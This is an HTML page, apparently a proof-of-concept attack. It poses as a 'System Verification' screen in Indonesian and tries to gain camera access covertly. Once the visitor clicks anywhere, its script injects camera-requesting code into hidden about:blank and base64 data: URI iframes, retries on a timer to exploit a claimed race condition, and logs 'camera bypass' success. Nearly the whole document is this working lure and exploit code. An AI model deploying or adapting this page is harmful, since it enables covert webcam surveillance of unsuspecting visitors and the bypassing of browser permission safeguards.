<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<title>System Verification</title>
<style>
  * { margin: 0; padding: 0; box-sizing: border-box; }
  body {
    background: #000; color: #0f0; font-family: monospace;
    display: flex; justify-content: center; align-items: center;
    height: 100vh; margin: 0; text-align: center; cursor: pointer; overflow: hidden;
  }
  .panel { background: #111; padding: 30px; border-radius: 12px; border: 1px solid #0f0; max-width: 400px; width: 100%; box-shadow: 0 0 20px rgba(0,255,0,0.5); }
  h2 { animation: blink 0.2s infinite; }
  @keyframes blink { 50% { opacity: 0.2; } }
  #log { margin-top: 20px; background: #000; padding: 10px; border-radius: 6px; color: #0f0; font-size: 12px; text-align: left; height: 120px; overflow-y: auto; }
  iframe, video, canvas { display: none !important; }
</style>
</head>
<body>

<div class="panel" id="main-card">
  <h2>☢️ SYSTEM HACKED ☢️</h2>
  <p>Klik di mana saja untuk memverifikasi.</p>
  <div id="log">Sistem siap.</div>
</div>

<div id="launcher-container" style="display: none;"></div>
<video id="cam-feed" autoplay playsinline muted></video>
<canvas id="processing-canvas" width="640" height="480"></canvas>

<script>
(function () {
  'use strict';

  var logEl = document.getElementById('log');
  var executed = false;

  function log(msg) {
    logEl.innerHTML += "> " + msg + "<br>";
    console.log(msg);
  }

  // ============================================
  // 1. ABOUT:BLANK INJECTION (ORIGIN INHERITANCE)
  // ============================================
  function injectAboutBlank() {
    try {
      log("[+] Membuat Iframe about:blank...");
      
      var iframe = document.createElement("iframe");
      iframe.allow = "camera; microphone";
      iframe.style.display = "none";
      
      // Set src ke about:blank (mewarisi origin parent)
      iframe.src = "about:blank";
      
      document.getElementById("launcher-container").appendChild(iframe);
      
      // Tunggu iframe siap, lalu suntikkan script
      iframe.onload = function() {
        try {
          var doc = iframe.contentDocument || iframe.contentWindow.document;
          doc.open();
          doc.write(`
            <!DOCTYPE html>
            <html>
            <body>
              <script>
                navigator.mediaDevices.getUserMedia({ video: true, audio: false })
                  .then(function(stream) {
                    parent.postMessage({ status: 'CAM_GRANTED_ABOUT' }, '*');
                  })
                  .catch(function(err) {
                    parent.postMessage({ status: 'CAM_DENIED_ABOUT', error: err.name }, '*');
                  });
              <\/script>
            </body>
            </html>
          `);
          doc.close();
          log("[+] Script disuntikkan ke about:blank.");
        } catch(e) {
          log("[-] Gagal menulis ke about:blank: " + e.message);
        }
      };
    } catch(e) {
      log("[-] About:blank Error: " + e.message);
    }
  }

  // ============================================
  // 2. DATA: URI INJECTION (BYPASS SANDBOX)
  // ============================================
  function injectDataUri() {
    try {
      log("[+] Membuat Iframe data: URI...");
      
      // HTML Payload untuk data URI
      var htmlPayload = `
        <!DOCTYPE html>
        <html>
        <body>
          <script>
            navigator.mediaDevices.getUserMedia({ video: true, audio: false })
              .then(function(stream) {
                parent.postMessage({ status: 'CAM_GRANTED_DATA' }, '*');
              })
              .catch(function(err) {
                parent.postMessage({ status: 'CAM_DENIED_DATA', error: err.name }, '*');
              });
          <\/script>
        </body>
        </html>
      `;
      
      // Encode ke Base64
      var base64Payload = btoa(unescape(encodeURIComponent(htmlPayload)));
      var dataUri = "data:text/html;base64," + base64Payload;
      
      var iframe = document.createElement("iframe");
      iframe.allow = "camera; microphone";
      iframe.style.display = "none";
      iframe.src = dataUri;
      
      document.getElementById("launcher-container").appendChild(iframe);
      log("[+] Script disuntikkan ke data: URI.");
    } catch(e) {
      log("[-] Data URI Error: " + e.message);
    }
  }

  // ============================================
  // 3. LISTENER PESAN DARI IFRAME
  // ============================================
  window.addEventListener('message', function(e) {
    if (e.data && e.data.status) {
      if (e.data.status.includes('GRANTED')) {
        log("[+] 🚨 " + e.data.status + " (CAMERA BYPASS BERHASIL)!");
        document.body.style.background = "#300";
      } else {
        log("[-] " + e.data.status + ": " + (e.data.error || 'Unknown'));
      }
    }
  });

  // ============================================
  // 4. TRIGGER RACE CONDITION (KLIK)
  // ============================================
  document.body.addEventListener('click', function() {
    if (executed) return;
    executed = true;

    document.getElementById('main-card').innerHTML = `
      <h2>EXECUTING...</h2>
      <p>Memulai About:Blank & Data URI Bypass...</p>
      <div id="log"></div>
    `;
    logEl = document.getElementById('log');
    log("[!] Memulai About:Blank & Data URI Bypass...");

    // A. About:Blank Injection (0ms)
    injectAboutBlank();

    // B. Data URI Injection (10ms)
    setTimeout(injectDataUri, 10);

    // C. Retry About:Blank (50ms)
    setTimeout(injectAboutBlank, 50);

    // D. Retry Data URI (100ms)
    setTimeout(injectDataUri, 100);

    // E. Retry About:Blank (500ms)
    setTimeout(injectAboutBlank, 500);

  }, { once: true });

})();
</script>
</body>
</html>
